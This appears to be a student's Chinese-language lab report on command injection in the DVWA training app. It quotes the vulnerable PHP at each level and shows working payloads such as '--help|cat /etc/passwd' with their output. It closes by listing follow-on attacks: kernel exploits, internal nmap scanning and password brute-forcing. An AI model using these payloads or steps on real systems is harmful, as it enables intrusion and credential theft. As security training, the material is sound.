# Ex2

命令注入

## 命令注入的3个条件；（15分）

* 网站提供系统指令执行功能
* 网站对用户输入校验不够严格
* 网站会将命令执行结果进行回显

## Low等级、Medium等级以及High等级；（30分）

### Low

* 以下为页面源代码

```php
if( isset( $_POST[ 'Submit' ]  ) ) {
    // Get input
    $target = $_REQUEST[ 'ip' ];

    // Determine OS and execute the ping command.
    if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
        // Windows
        $cmd = shell_exec( 'ping  ' . $target );
    }
    else {
        // *nix
        $cmd = shell_exec( 'ping  -c 4 ' . $target );
    }

    // Feedback for the end user
    echo "<pre>{$cmd}</pre>";
}
```

根据代码分析，可得知**ip参数**存在命令注入漏洞，构造注入内容```--help|uname -a```，点击提交即可。

提交之后，实际上服务器执行的命令为```ping  -c 4 --help|uname -a```，**ping命令**的标准输出传递到**uname命令**的标准输入，由于**uname命令**不需要输入内容，所以**ping命令**的输出会被忽略，使用参数```--help```可以使**ping命令**不会进行等待。

```log
Linux kali-linux-2021-3 5.14.0-kali2-arm64 #1 SMP Debian 5.14.9-2kali1 (2021-10-04) aarch64 GNU/Linux
```

### Medium

* 以下为页面源代码

```php
if( isset( $_POST[ 'Submit' ]  ) ) {
    // Get input
    $target = $_REQUEST[ 'ip' ];

    // Set blacklist
    $substitutions = array(
        '&&' => '',
        ';'  => '',
    );

    // Remove any of the charactars in the array (blacklist).
    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );

    // Determine OS and execute the ping command.
    if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
        // Windows
        $cmd = shell_exec( 'ping  ' . $target );
    }
    else {
        // *nix
        $cmd = shell_exec( 'ping  -c 4 ' . $target );
    }

    // Feedback for the end user
    echo "<pre>{$cmd}</pre>";
}

```

根据代码分析，可得知**Medium等级**相较于**Low等级**增加了**字符过滤**。

但由于过滤并不完善，构造注入内容```--help|ip a```，点击提交即可。

提交后可以得到以下运行结果。

```log
1: lo:  mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0:  mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 00:1c:42:ad:90:69 brd ff:ff:ff:ff:ff:ff
    inet 10.211.55.8/24 brd 10.211.55.255 scope global dynamic noprefixroute eth0
       valid_lft 992sec preferred_lft 992sec
    inet6 fdb2:2c26:f4e4:0:a514:b05e:182b:716e/64 scope global temporary dynamic 
       valid_lft 603938sec preferred_lft 85458sec
    inet6 fdb2:2c26:f4e4:0:21c:42ff:fead:9069/64 scope global dynamic mngtmpaddr noprefixroute 
       valid_lft 2591752sec preferred_lft 604552sec
    inet6 fe80::21c:42ff:fead:9069/64 scope link noprefixroute 
       valid_lft forever preferred_lft forever
```

### High

* 以下为页面源代码

```php
if( isset( $_POST[ 'Submit' ]  ) ) {
    // Get input
    $target = trim($_REQUEST[ 'ip' ]);

    // Set blacklist
    $substitutions = array(
        '&'  => '',
        ';'  => '',
        '| ' => '',
        '-'  => '',
        '$'  => '',
        '('  => '',
        ')'  => '',
        '`'  => '',
        '||' => '',
    );

    // Remove any of the charactars in the array (blacklist).
    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );

    // Determine OS and execute the ping command.
    if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
        // Windows
        $cmd = shell_exec( 'ping  ' . $target );
    }
    else {
        // *nix
        $cmd = shell_exec( 'ping  -c 4 ' . $target );
    }

    // Feedback for the end user
    echo "<pre>{$cmd}</pre>";
}
```

根据代码分析，可得知**High等级**相较于**Medium等级**对**字符过滤**进行了增强。

但是在过滤```|```字符时，多加了一个空格，所以只要在构造注入数据时不产生```| ```即可。

构造```--help|cat /etc/passwd```，提交，done。

```log
root:x:0:0:root:/root:/usr/bin/zsh
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
...以下省略若干行...
```

## Impossible等级的机制以及修复、防御命令注入的方法。（30分）

* 以下为页面源代码

```log
if( isset( $_POST[ 'Submit' ]  ) ) {
    // Check Anti-CSRF token
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

    // Get input
    $target = $_REQUEST[ 'ip' ];
    $target = stripslashes( $target );

    // Split the IP into 4 octects
    $octet = explode( ".", $target );

    // Check IF each octet is an integer
    if( ( is_numeric( $octet[0] ) ) && ( is_numeric( $octet[1] ) ) && ( is_numeric( $octet[2] ) ) && ( is_numeric( $octet[3] ) ) && ( sizeof( $octet ) == 4 ) ) {
        // If all 4 octets are int's put the IP back together.
        $target = $octet[0] . '.' . $octet[1] . '.' . $octet[2] . '.' . $octet[3];

        // Determine OS and execute the ping command.
        if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
            // Windows
            $cmd = shell_exec( 'ping  ' . $target );
        }
        else {
            // *nix
            $cmd = shell_exec( 'ping  -c 4 ' . $target );
        }

        // Feedback for the end user
        echo "<pre>{$cmd}</pre>";
    }
    else {
        // Ops. Let the user name theres a mistake
        echo '<pre>ERROR: You have entered an invalid IP.</pre>';
    }
}

// Generate Anti-CSRF token
generateSessionToken();
```

根据代码分析，可得知**High等级**相较于**Medium等级**对**字符过滤**进行了增强。

注入数据需要符合以下格式才可以被执行：

* 使用```.```进行分割，并恰好可被分割成**4个**字符串
* 分割的**4个**字符串，都为数字

但是显然，符合这种格式的字符串无法进行命令注入。

## 描述2）和3）之外你所知道的其他技巧(3种以上)。（15分）

* 由Low中输出结果得知的内核版本信息，可以找到针对内核版本的攻击方式。
* 由Medium中输出结果得知的IP信息，可以通过内网渗透的方式进行攻击，如：通过nmap扫描，再针对服务版本进行攻击。
* 由High中输出结果得知的用户信息，可以针对这些用户名进行弱口令爆破。
